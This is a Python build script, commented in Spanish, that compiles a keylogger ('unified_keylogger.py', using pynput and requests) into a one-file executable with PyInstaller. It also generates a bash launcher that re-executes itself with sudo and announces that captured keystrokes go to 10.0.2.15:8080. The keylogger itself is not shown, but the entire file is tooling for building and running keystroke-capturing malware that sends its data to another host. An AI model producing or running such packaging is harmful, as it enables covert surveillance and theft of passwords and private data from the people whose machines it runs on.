#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import shutil

def install_pyinstaller():
    """instala pyinstaller si no esta disponible"""
    try:
        import PyInstaller
        print("pyinstaller ya esta instalado")
    except ImportError:
        print("instalando pyinstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
        print("pyinstaller instalado correctamente")

def build_executable():
    """compila el keylogger a ejecutable"""
    print("compilando keylogger...")
    
    # limpiar compilaciones anteriores
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists("keylogger.spec"):
        os.remove("keylogger.spec")
    
    # comando de compilacion
    cmd = [
        "pyinstaller",
        "--onefile",
        "--console",
        "--name=keylogger",
        "--add-data=reconstructor.py:.",
        "--hidden-import=pynput",
        "--hidden-import=requests",
        "unified_keylogger.py"
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print("\n" + "="*50)
        print("ejecutable creado exitosamente")
        print("="*50)
        print("ubicacion: dist/keylogger")
        print("uso: sudo ./dist/keylogger")
        print("tamaño:", get_file_size("dist/keylogger"))
        print("="*50)
        return True
    except subprocess.CalledProcessError as e:
        print(f"error compilando: {e}")
        return False

def get_file_size(filepath):
    """obtiene el tamaño del archivo"""
    try:
        size = os.path.getsize(filepath)
        if size < 1024:
            return f"{size} bytes"
        elif size < 1024*1024:
            return f"{size/1024:.1f} KB"
        else:
            return f"{size/(1024*1024):.1f} MB"
    except:
        return "desconocido"

def create_launcher():
    """crea script de lanzamiento opcional"""
    launcher_content = """#!/bin/bash
# lanzador automatico del keylogger

echo "keylogger compilado"
echo "=================="

# verificar si el ejecutable existe
if [ ! -f "dist/keylogger" ]; then
    echo "error: ejecutable no encontrado"
    echo "ejecuta primero: python build_keylogger.py"
    exit 1
fi

# verificar permisos de root
if [ "$EUID" -ne 0 ]; then
    echo "necesitas permisos de administrador"
    echo "relanzando con sudo..."
    exec sudo "$0" "$@"
fi

echo "iniciando keylogger..."
echo "configurado para enviar a: 10.0.2.15:8080"
echo "presiona ctrl+c para detener"
echo ""

# ejecutar keylogger
./dist/keylogger

echo ""
echo "keylogger detenido"
read -p "presiona enter para salir..."
"""
    
    with open("run_keylogger.sh", "w") as f:
        f.write(launcher_content)
    
    os.chmod("run_keylogger.sh", 0o755)
    print("script de lanzamiento creado: run_keylogger.sh")

def main():
    print("compilador de keylogger")
    print("======================")
    print("")
    
    # verificar archivos necesarios
    required_files = ["unified_keylogger.py", "reconstructor.py"]
    for file in required_files:
        if not os.path.exists(file):
            print(f"error: {file} no encontrado")
            return
    
    # instalar pyinstaller
    install_pyinstaller()
    
    # compilar ejecutable
    if build_executable():
        create_launcher()
        print("\ncompilacion completada exitosamente")
        print("opciones de ejecucion:")
        print("1. sudo ./dist/keylogger")
        print("2. sudo ./run_keylogger.sh")
    else:
        print("error en la compilacion")

if __name__ == "__main__":
    main()
